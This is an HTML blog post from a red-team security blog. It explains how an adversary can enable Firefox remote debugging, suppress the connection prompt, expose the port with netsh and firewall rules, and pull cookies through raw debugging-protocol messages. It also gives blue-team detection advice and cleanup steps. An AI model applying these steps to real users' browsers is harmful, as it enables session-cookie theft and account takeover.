@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Remotely Debugging Firefox &middot;  wunderwuzzi blog" />
+  
+  <meta property="og:site_name" content="wunderwuzzi blog" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2020/cookies-on-firefox/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2020-07-11T18:18:51-07:00" />
+  
+  <meta property="og:article:tag" content="cookies" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="blue" />
+  
+  <meta property="og:article:tag" content="passthecookie" />
+  
+  <meta property="og:article:tag" content="ttp" />
+  
+  <meta property="og:article:tag" content="post-exploitation" />
+  
+  
+
+  <title>
+     Remotely Debugging Firefox &middot;  wunderwuzzi blog
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /images/bg.jpg )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">wunderwuzzi blog</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        Embrace the Red
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM">Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+      
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Remotely Debugging Firefox</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2020-07-11T18:18:51-07:00">
+          Jul 11, 2020
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/cookies">#cookies</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/blue">#blue</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/passthecookie">#passthecookie</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ttp">#ttp</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/post-exploitation">#post-exploitation</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    
+
+<p>In a <a href="/blog/posts/2020/chrome-spy-remote-control">previous post</a> we talked about how remote debugging works on Chrome, and we also covered the <a href="/blog/posts/2020/cookie-crimes-on-microsoft-edge">latest Microsoft Edge browser</a>.</p>
+
+<p>These features allow an adversary to gain access to authentication tokens and cookies. See <a href="https://attack.mitre.org/techniques/T1539/">MITRE ATT&amp;CK Technique T1539: Steal Web Session Cookie</a> as well for this.</p>
+
+<p>Sinc we covered Chrome and Edge before, I was wondering if Firefox offers debugging features as well, and how one could detect malware trying to exploit it.</p>
+
+<p><em>This article was written a few months back, just never got to post it. So, here we go.</em></p>
+
+<p><em>There is an important update mentioned further down below about a new <code>getAllCookies()</code> API that was just introduced by Mozilla to align with Chrome&rsquo;s features set. I will post about that seperately.</em></p>
+
+<h2 id="remote-debugging-command-control-ui">Remote Debugging Command &amp; Control UI</h2>
+
+<p>The cool thing is that Firefox comes with a built-in UI for handling multiple remote browser connections. One can choose and switch between them:</p>
+
+<p><img src="/blog/images/2020/firefox.debug.connect.multiple.png" alt="Connecting to multiple debug servers" /></p>
+
+<p>See the <code>Connect</code> button? It allows to connect and debug those remote Firefox intances!</p>
+
+<p>How to get there? Let&rsquo;s start with the basics first.</p>
+
+<h2 id="enabling-remote-debugging-in-firefox">Enabling Remote Debugging in Firefox</h2>
+
+<p>Unlike Chrome, <strong>Firefox disables this feature by default!</strong></p>
+
+<p>So first, malware would have to enable it by updating <code>user.js</code> file (or <code>prefs.js</code>) configuration files in the user&rsquo;s Firefox profile.</p>
+
+<p>On Windows the files are located at:</p>
+
+<p><code>$AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\</code></p>
+
+<p><em>Note:</em> There might be multiple profiles present in the folder.</p>
+
+<p>These are the updates that are required to enabled remote debugging:</p>
+
+<pre><code>user_pref(&quot;devtools.chrome.enabled&quot;, true);
+user_pref(&quot;devtools.debugger.remote-enabled&quot;, true);
+user_pref(&quot;devtools.debugger.prompt-connection&quot;, false);
+</code></pre>
+
+<p>These updates the remote debugging features, and disables security prompts the user would normally see by default.</p>
+
+<p>You can find the corresponding configurations under <strong>Development Settings</strong>:
+    <img src="/blog/images/2020/firefox.debug.settings.png" alt="Security Settings" /></p>
+
+<p>And this is how the security prompt would look like that we disabled:
+    <img src="/blog/images/2020/firefox.debugger.permission.png" alt="Security Prompt" /></p>
+
+<p>The user sees this prompt when a client connects to the debugging endpoint. The <code>devtools.debugger.prompt-connection</code> setting in the configuration file controls this behaviour.</p>
+
+<h3 id="blue-team-detection">Blue Team Detection</h3>
+
+<p><strong>This is a great place for blue teams to build detections to catch and alert on malware that would modify the settings to enable the features.</strong></p>
+
+<h2 id="using-firefox-remote-debugging">Using Firefox Remote Debugging</h2>
+
+<p>After updating the configuration, one can launch a new instance of Firefox using:</p>
+
+<p><code>&amp; 'C:\Program Files\Mozilla Firefox\firefox.exe' -start-debugger-server 9222</code></p>
+
+<p>There are also the options for <code>--headless</code> and so forth that you can experiment around with.</p>
+
+<p>This is how it looks like:</p>
+
+<p><img src="/blog/images/2020/firefox.debugger.running.png" alt="PowerShell run Firefox with remote debugging" /></p>
+
+<p>As you can see, this only listens on the <strong>local interface</strong>.</p>
+
+<h2 id="tunneling-traffic-to-remote-machines">Tunneling traffic to remote machines</h2>
+
+<p>The debugging port is only available locally, an adversary will try to make that remotely accessible via port forwarding.</p>
+
+<p><strong>Important: This traffic is sent in clear text, so be aware and consider using ssh port forwarding to encrypt traffic</strong></p>
+
+<p>In Windows, this can be done by an Administrator using the <code>netsh interface portproxy</code> command.</p>
+
+<p>The following command shows how this is performed:</p>
+
+<pre><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222
+</code></pre>
+
+<p>Now, remote connections to this port will not be allowed because the firewall blocks them (we forwarded to port 48333). We have to add a new firewall rule to allow port 48333. So, let&rsquo;s allow that port through the firewall.</p>
+
+<p>There are multiple ways to do this on Windows (we focus on Window now, but all this should also work on macOS and Linux):</p>
+
+<ol>
+<li><p>Use netsh to add a new firewall rule:</p>
+
+<p><code>netsh advfirewall firewall add rule name=&quot;Open Port 48333&quot; dir=in action=allow protocol=TCP localport=48333</code></p></li>
+
+<li><p>On modern Windows machines, this can also be done via PowerShell commands:</p>
+
+<p><code>New-NetFirewallRule -Name FirefoxRemote -DisplayName &quot;Open Port 48333&quot; -Direction Inbound -Protocol tcp -LocalPort 48333 -Action Allow -Enabled True</code></p></li>
+</ol>
+
+<p>Now, it is all setup to connect to from another machine.</p>
+
+<h2 id="debugging-remote-firefox-instances">Debugging remote Firefox instances</h2>
+
+<p>Now that the debugging port is exposed remotely, we can attach Firefox on <em>another machine</em> to it. Let&rsquo;s walk through the steps on how this works:</p>
+
+<ol>
+<li><p>Navigate to <code>about:debugging</code> in the browser URL (or click Web Developer Tools - Remote Debugger). This is where you can connect to remote devices runnning Firefox. Click &ldquo;Add&rdquo; to add a new server to connect to.</p>
+
+<p><img src="/blog/images/2020/firefox.debugger.remoteadd.png" alt="Adding a new remote server" /></p></li>
+
+<li><p>It is also possible to add  multiple debug server as seen in this screenshot. This basically allows to have a mini C2 to remote control multiple browsers.</p>
+
+<p><img src="/blog/images/2020/firefox.debug.connect.multiple.png" alt="Connecting to multiple debug servers" /></p></li>
+
+<li><p>Use the <code>Connect</code> button to connect to a particular browser instance. Once connected you can run commands in the console, navigate the user to a different page, and also inspect storage and cookies as seen in the following screenshot.</p>
+
+<p><img src="/blog/images/2020/firefox.debugger.remotecookies.png" alt="Inspecting Cookies remotely" /></p></li>
+</ol>
+
+<p>That&rsquo;s it, all pretty cool I think. :)</p>
+
+<h2 id="automation">Automation</h2>
+
+<p>I have not yet spent much time to research the protocol to automate this. The protocol is documented <a href="https://docs.firefox-dev.tools/backend/protocol.html">here</a> and while digging into this in more detail, I ran across this Bugzilla entry:</p>
+
+<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1605061">https://bugzilla.mozilla.org/show_bug.cgi?id=1605061</a></p>
+
+<p><strong>Yes</strong>, this means Firefox will also implement the <code>Network.getAllCookies()</code> API - similar to how it works today with Chrome via Cookie Crimes.</p>
+
+<h2 id="update-i-just-checked-the-bug-again-and-the-getallcookies-api-exists-now-wow"><strong>UPDATE:</strong> I just checked the bug again, and the getAllCookies() API exists now. Wow.&ldquo;.</h2>
+
+<p>Here are some basics about the protocol that I was able to figure out.</p>
+
+<p>The default protocol is a simple one, it consists of sending <code>length:JSONREQUEST</code>.</p>
+
+<p>Connect via telnet or netcat, and send the following strings in:</p>
+
+<p><code>30:{&quot;type&quot;:&quot;getRoot&quot;,&quot;to&quot;:&quot;root&quot;}</code></p>
+
+<p>Some other commands I figured out to get the contents of a site:</p>
+
+<pre><code>31:{&quot;to&quot;:&quot;root&quot;,&quot;type&quot;:&quot;listTabs&quot;}
+57:{&quot;type&quot;:&quot;getTarget&quot;,&quot;to&quot;:&quot;server1.conn21.tabDescriptor7&quot;}
+65:{&quot;type&quot;:&quot;listStores&quot;,&quot;to&quot;:&quot;server1.conn21.child21/storageActor5&quot;}
+124:{&quot;type&quot;:&quot;getStoreObjects&quot;,&quot;host&quot;:&quot;https://www.google.com&quot;,&quot;names&quot;:null,&quot;options&quot;:{},&quot;to&quot;:&quot;server1.conn21.child21/cookies20&quot;}
+</code></pre>
+
+<p>The identifiers for connections and actors  (such as conn21 or child 21) change everytime, so this needs a little scripting to automate - which I have not worked on. I will be waiting for the handy <code>getAllCookies</code> API.</p>
+
+<h2 id="cleaning-up-and-reverting-changes">Cleaning up and reverting changes</h2>
+
+<p>Keep in mind that port forwarding was set up earlier to enable the remote exposure of the Firefox debugging API on port 48333. In order to remove port forwarding and revert to the defaults, we can run  the following command:</p>
+
+<p><code>netsh interface portproxy reset</code></p>
+
+<p>Alternatively, there is a delete argument.</p>
+
+<p>The same applies for opening port 48333. The firewall rule can be removed again using the following command:</p>
+
+<p><code>netsh advfirewall firewall del rule name=&quot;Open Port 48333&quot;</code></p>
+
+<p>or if you used the PowerShell example:</p>
+
+<p><code>Remove-NetFirewallRule -Name FirefoxRemote</code></p>
+
+<h2 id="detections-and-mitigations">Detections and Mitigations</h2>
+
+<ul>
+<li>Blue teams should look for anyone using the <code>-start-debugger-server</code> and related features to identify potential misuse. Be aware on Linux/macOS the argument is <code>--start-debugger-server</code></li>
+<li>Similarly, observe and monitor for port forwarding on hosts</li>
+<li>Monitor for changes to <code>user.js</code> and <code>prefs.js</code> files that modify the remote debugging settings for each user and profile under <code>$AppData\Roaming\Mozilla\Firefox\Profiles\</code>.  Malware that wants to leverage the built in features might update the files.</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>In this post we explored remote debugging and how it can be used with Firefox. Hope the post was informative and useful.</p>
+
+<p>Feel free to follow or message me on Twitter <a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a>.</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+<li><a href="https://docs.firefox-dev.tools/backend/protocol.html">Firefox Remote Debugging Protocol</a>.</li>
+<li><a href="https://attack.mitre.org/techniques/T1539/">MITRE ATT&amp;CK Technique T1539: Steal Web Session Cookie</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1506/">MITRE ATT&amp;CK Technique T1506: Web Session Cookie</a></li>
+<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1605061">BugZilla - getAllCookies</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2020/aws-xss-cross-site-scripting-vulnerability/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2020
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
